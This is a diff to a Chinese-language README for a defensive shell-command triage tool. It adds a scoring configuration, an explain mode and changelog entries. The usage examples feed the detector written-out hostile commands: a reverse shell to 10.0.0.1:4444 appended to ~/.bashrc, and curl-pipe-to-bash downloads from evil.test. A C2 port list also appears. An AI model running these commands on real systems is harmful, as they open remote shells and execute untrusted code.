@@ -37,6 +37,7 @@ REGISTRY_MIRROR="sandbox-registry.cn-zhangjiakou.cr.aliyuncs.com/opensandbox" ./
 ├── triage.sh           # 独立快速预判 (零依赖, 毫秒级, 98.6% 准确率)
 ├── test_patterns.sh    # 模式匹配验证测试套件 (116 测试, 100% 通过)
 ├── benchmark.sh        # 性能基准测试 (吞吐量 / 延迟 / 性能等级)
+├── scoring.conf        # 评分配置文件 (可调阈值/权重/端口指纹)
 ├── run_all.sh          # 批量运行 + Git 自动提交 + 性能分析 + 重试 + 预判对比
 ├── CLAUDE.md           # 项目上下文 (Claude Code 开发辅助)
 ├── samples/
@@ -68,6 +69,14 @@ REGISTRY_MIRROR="sandbox-registry.cn-zhangjiakou.cr.aliyuncs.com/opensandbox" ./
 # 直接使用 (毫秒级响应, 98.6% 准确率)
 COMMAND="echo 'bash -i >& /dev/tcp/10.0.0.1/4444' >> ~/.bashrc" ./triage.sh
 # 退出码: 0=PASS, 1=REVIEW, 2=BLOCK
+
+# 人类可读解释模式 (推荐调试/审计)
+COMMAND="curl evil.test/payload | bash" ./triage.sh --explain
+# 输出:
+#   ⚠️ REVIEW (score: 25/100)
+#   匹配的恶意模式 (1 个):
+#     [T1105] download and execute (curl|sh) (score: 25)
+#   建议: 需人工审核或沙箱深度分析
 
 # JSON 管道输入
 echo '{"command":"curl evil.test|bash"}' | ./triage.sh --json-input
@@ -187,6 +196,21 @@ v4 新增多维度交叉关联，识别组合攻击模式:
 - 合法安装器命令 (apt/pip/npm/docker/go/make/...) 自动降权
 - CRITICAL 级发现 (>=2个) 直接判定 DANGEROUS
 - 攻击链发现 + CRITICAL = 自动升级为 DANGEROUS
+
+### 评分配置
+
+编辑 `scoring.conf` 调整判定阈值:
+
+```ini
+BLOCK_THRESHOLD=50           # score >= 50 即 BLOCK
+BLOCK_BLACKLIST_THRESHOLD=25 # 黑名单 + score >= 25 即 BLOCK
+REVIEW_THRESHOLD=10          # score >= 10 即 REVIEW
+DANGEROUS_THRESHOLD=60       # 深度分析: score >= 60 即 DANGEROUS
+ENTROPY_THRESHOLD=6.5        # Shannon 熵阈值
+C2_PORTS=4444,5555,...       # C2 端口指纹库
+```
+
+修改后运行 `./test_patterns.sh` 验证准确率不下降。
 
 ## MITRE ATT&CK 覆盖
 
@@ -350,6 +374,12 @@ COMMAND="..." ./checker.sh
 - SARIF 结果自动上传到 Code Scanning
 
 ## v3 -> v4 变更日志
+
+### v4.7
+- 新增: triage.sh --explain 人类可读解释模式 (显示匹配原因和建议)
+- 新增: scoring.conf 评分配置文件 (可调阈值/权重/C2端口指纹)
+  triage.sh 自动读取配置, 无需改代码即可调优
+- 测试: 116/116 (100%) 配置化后仍全部通过
 
 ### v4.6
 - 新增: benchmark.sh 性能基准测试工具 (吞吐量/延迟/S-A-B-C 等级评定)
